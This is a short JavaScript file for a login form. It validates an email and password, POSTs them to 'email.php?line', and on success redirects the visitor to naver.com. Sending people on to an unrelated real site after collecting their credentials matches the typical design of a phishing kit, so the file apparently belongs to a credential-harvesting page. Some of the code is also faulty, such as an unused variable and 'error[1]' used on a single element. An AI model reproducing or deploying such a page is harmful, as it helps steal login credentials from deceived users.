var btnLogin = document.getElementById("login");
var email = document.getElementById("email");
var password = document.getElementById("password");
var checkMail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;

email.addEventListener('input', function(){
	if(!email.value.match(checkMail)){
		return false;
	}else{
		password.focus();
		return true
	}
})

password.addEventListener('input', function(){
	if(password.value.length > 4){
		btnLogin.className = btnLogin.className.replace(/\bExDisabled\b/g, "ExEnabled");
		btnLogin.disabled = false;
		return true;
	}else{
		return false;
	}
})

btnLogin.addEventListener('click', function(e){
	e.preventDefault();
    var error = document.querySelector("#error");
    
	if(email.value === ""){
		error.textContent = "Enter your email!";
		email.style.borderColor = "red";
		email.focus();
		return false;
	}else if(password.value === ""){
		error.textContent = "Enter your password!";
		password.style.borderColor = "red";
		password.focus();
		return false;
	} else {
		var processing = document.getElementById("processing");
		error.textContent = "";
		processing.textContent = "Logging in...";

		var xmlhttp;
	    if(window.XMLHttpRequest){
	      xmlhttp = new XMLHttpRequest();
	    }else{
	      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	    }

	    xmlhttp.onreadystatechange=function(){
	      if(xmlhttp.readyState==4 && xmlhttp.status==200){
	      	console.log(xmlhttp.responseText);
	      	var res = xmlhttp.responseText.replace(/\s+/g, "");
	      	if(xmlhttp.responseText === 'true'){
	      		window.location = 'https://naver.com';
	      	}else {
	      		processing.textContent = "";
	      		error[1].textContent = "Something went wrong! Please try again.";
	      	}
	      }
	    }

    	var formdata = new FormData();

    	formdata.append("email", email.value);
    	formdata.append("password", password.value);

	    var url = 'email.php?line';
	    
	    xmlhttp.open("POST", url);
	    xmlhttp.send(formdata);

	    return true;
	}
})